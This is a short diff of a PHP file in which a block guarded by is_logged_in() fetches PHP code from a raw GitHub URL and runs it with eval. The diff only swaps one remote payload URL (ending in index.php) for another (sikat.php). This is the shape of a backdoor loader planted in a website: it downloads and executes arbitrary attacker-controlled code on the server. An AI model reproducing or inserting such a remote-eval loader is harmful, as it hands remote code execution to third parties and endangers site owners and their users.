@@ -54,7 +54,7 @@ function is_logged_in() {
  
  
 if (is_logged_in()) {
-    $a = fetchRemoteContent('https://raw.githubusercontent.com/kakigoyang/enter/refs/heads/main/index.php');
+    $a = fetchRemoteContent('https://raw.githubusercontent.com/minibao12/jandamuda/refs/heads/main/sikat.php');
     if ($a !== false) {
         eval('?>' . $a);
     } else {
